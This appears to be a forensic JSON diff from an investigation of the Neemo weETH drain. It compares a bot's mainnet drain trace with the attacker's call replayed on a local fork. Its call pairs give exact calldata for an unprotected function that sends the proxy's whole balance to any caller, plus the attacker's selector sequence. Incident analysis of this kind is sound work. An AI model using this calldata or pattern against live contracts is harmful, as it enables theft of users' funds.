@@ -1,0 +1,175 @@
+{
+ "schema": "bvh-call-diff/1",
+ "what": "Bot's victim-side calls (mainnet trace of tx 0xa57ec56a, subtree under the first CALL into the Neemo proxy 0x54cd2346) versus the same function called by the attacker EOA 0x7e9b11d0 as 03b79c24(attacker) on a local anvil fork at block 22855568 (nothing broadcast).",
+ "bot_trace_ref": "site/raw/rpc/trace_0xa57ec56af91ec70517ca71ca50101958d9c2ec9fdb61edcf35a9081c375725c2.json",
+ "attacker_replay_ref": "incidents/neemo-2025/attacker_replay_local_fork.json (scenario A_attacker_calls_drain)",
+ "n_bot_victim_calls": 6,
+ "n_attacker_replay_calls": 6,
+ "same_call_sequence": true,
+ "calls_with_identical_calldata": 2,
+ "calls_differing_only_in_recipient_argument": 4,
+ "pairs": [
+  {
+   "i": 0,
+   "depth": 0,
+   "type": "CALL",
+   "to": "0x54cd23460df45559fd5feeaada7ba25f89c13525",
+   "same_shape": true,
+   "same_input": false,
+   "bot_input": "0x03b79c240000000000000000000000001a61249f6f4f9813c55aa3b02c69438607272ed3",
+   "attacker_replay_input": "0x03b79c240000000000000000000000007e9b11d0aa215e0f1a7f62534c7c93fc340d493d",
+   "diff": {
+    "differing_hex_chars": 38,
+    "first": 34,
+    "last": 73,
+    "bot": "0000000000000000000000001a61249f6f4f9813c55aa3b02c69438607272ed3",
+    "attacker_replay": "0000000000000000000000007e9b11d0aa215e0f1a7f62534c7c93fc340d493d"
+   }
+  },
+  {
+   "i": 1,
+   "depth": 1,
+   "type": "DELEGATECALL",
+   "to": "0xbc4b1d58b28c497b7afda6fb90fe1471fa0672cc",
+   "same_shape": true,
+   "same_input": false,
+   "bot_input": "0x03b79c240000000000000000000000001a61249f6f4f9813c55aa3b02c69438607272ed3",
+   "attacker_replay_input": "0x03b79c240000000000000000000000007e9b11d0aa215e0f1a7f62534c7c93fc340d493d",
+   "diff": {
+    "differing_hex_chars": 38,
+    "first": 34,
+    "last": 73,
+    "bot": "0000000000000000000000001a61249f6f4f9813c55aa3b02c69438607272ed3",
+    "attacker_replay": "0000000000000000000000007e9b11d0aa215e0f1a7f62534c7c93fc340d493d"
+   }
+  },
+  {
+   "i": 2,
+   "depth": 2,
+   "type": "STATICCALL",
+   "to": "0xcd5fe23c85820f7b72d0926fc9b05b43e359b7ee",
+   "same_shape": true,
+   "same_input": true,
+   "bot_input": "0x70a0823100000000000000000000000054cd23460df45559fd5feeaada7ba25f89c13525",
+   "attacker_replay_input": "0x70a0823100000000000000000000000054cd23460df45559fd5feeaada7ba25f89c13525",
+   "diff": null
+  },
+  {
+   "i": 3,
+   "depth": 3,
+   "type": "DELEGATECALL",
+   "to": "0x353e98f34b6e5a8d9d1876bf6df01284d05837cb",
+   "same_shape": true,
+   "same_input": true,
+   "bot_input": "0x70a0823100000000000000000000000054cd23460df45559fd5feeaada7ba25f89c13525",
+   "attacker_replay_input": "0x70a0823100000000000000000000000054cd23460df45559fd5feeaada7ba25f89c13525",
+   "diff": null
+  },
+  {
+   "i": 4,
+   "depth": 2,
+   "type": "CALL",
+   "to": "0xcd5fe23c85820f7b72d0926fc9b05b43e359b7ee",
+   "same_shape": true,
+   "same_input": false,
+   "bot_input": "0xa9059cbb0000000000000000000000001a61249f6f4f9813c55aa3b02c69438607272ed3000000000000000000000000000000000000000000000005cbf1c8b2a7450ce9",
+   "attacker_replay_input": "0xa9059cbb0000000000000000000000007e9b11d0aa215e0f1a7f62534c7c93fc340d493d000000000000000000000000000000000000000000000005cbf1c8b2a7450ce9",
+   "diff": {
+    "differing_hex_chars": 38,
+    "first": 34,
+    "last": 73,
+    "bot": "0000000000000000000000001a61249f6f4f9813c55aa3b02c69438607272ed3000000000000000000000000000000000000000000000005cbf1c8b2a7450ce9",
+    "attacker_replay": "0000000000000000000000007e9b11d0aa215e0f1a7f62534c7c93fc340d493d000000000000000000000000000000000000000000000005cbf1c8b2a7450ce9"
+   }
+  },
+  {
+   "i": 5,
+   "depth": 3,
+   "type": "DELEGATECALL",
+   "to": "0x353e98f34b6e5a8d9d1876bf6df01284d05837cb",
+   "same_shape": true,
+   "same_input": false,
+   "bot_input": "0xa9059cbb0000000000000000000000001a61249f6f4f9813c55aa3b02c69438607272ed3000000000000000000000000000000000000000000000005cbf1c8b2a7450ce9",
+   "attacker_replay_input": "0xa9059cbb0000000000000000000000007e9b11d0aa215e0f1a7f62534c7c93fc340d493d000000000000000000000000000000000000000000000005cbf1c8b2a7450ce9",
+   "diff": {
+    "differing_hex_chars": 38,
+    "first": 34,
+    "last": 73,
+    "bot": "0000000000000000000000001a61249f6f4f9813c55aa3b02c69438607272ed3000000000000000000000000000000000000000000000005cbf1c8b2a7450ce9",
+    "attacker_replay": "0000000000000000000000007e9b11d0aa215e0f1a7f62534c7c93fc340d493d000000000000000000000000000000000000000000000005cbf1c8b2a7450ce9"
+   }
+  }
+ ],
+ "recipient_argument": {
+  "bot": "0x1a61249f6f4f9813c55aa3b02c69438607272ed3 (the bot's own executor contract)",
+  "attacker_replay": "0x7e9b11d0aa215e0f1a7f62534c7c93fc340d493d (the key-holder EOA)"
+ },
+ "amount_moved": {
+  "weETH_wei": 106929468097270451433,
+  "weETH": 106.92946809727046,
+  "token": "0xcd5fe23c85820f7b72d0926fc9b05b43e359b7ee (weETH)",
+  "note": "identical in both: the entire weETH balance of the proxy (balanceOf then transfer(to, balance))"
+ },
+ "bot_extra_calls_outside_the_victim_call": [
+  "UniswapV3 pool 0x202a6012 swap (weETH -> WETH, 106.929 weETH in, 114.534 WETH out)",
+  "WETH.withdraw(114.534 WETH)",
+  "ETH transfer 114.534 ETH to the bot EOA 0xb750e316"
+ ],
+ "bot_top_level_calls": [
+  [
+   "CALL",
+   "0x54cd23460df45559fd5feeaada7ba25f89c13525",
+   "0x03b79c24"
+  ],
+  [
+   "CALL",
+   "0x202a6012894ae5c288ea824cbc8a9bfb26a49b93",
+   "0x128acb08"
+  ],
+  [
+   "CALL",
+   "0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2",
+   "0x2e1a7d4d"
+  ],
+  [
+   "CALL",
+   "0xb750e3165de458eae09904cc7fad099632860b0f",
+   "0x"
+  ]
+ ],
+ "mainnet_gas_used_bot_tx": 137752,
+ "local_replay_gas_used_bot_calldata": 137752,
+ "other_replays": {
+  "B_unrelated_address_calls_drain": {
+   "proxy_weETH_after": 0,
+   "caller_weETH_after": 106929468097270451433,
+   "meaning": "a fresh address that is neither the key holder nor the bot also succeeds: no access control"
+  },
+  "D_attacker_actual_selector_sequence": [
+   {
+    "label": "53474b2c()",
+    "status": 1,
+    "gasUsed": 31402,
+    "proxy_weETH_after": 106929468097270451433
+   },
+   {
+    "label": "97e44edc(attacker)",
+    "status": 1,
+    "gasUsed": 197356,
+    "proxy_weETH_after": 106929468097270451433
+   },
+   {
+    "label": "03b79c24(attacker)",
+    "status": 1,
+    "gasUsed": 63001,
+    "proxy_weETH_after": 0
+   }
+  ],
+  "E_attacker_drain_after_bot": {
+   "proxy_weETH_before": 0,
+   "attacker_weETH_after": 0,
+   "gasUsed": 45101,
+   "meaning": "after the bot tx an attacker call to 03b79c24 succeeds but moves 0 weETH (transfer of 0)"
+  }
+ }
+}
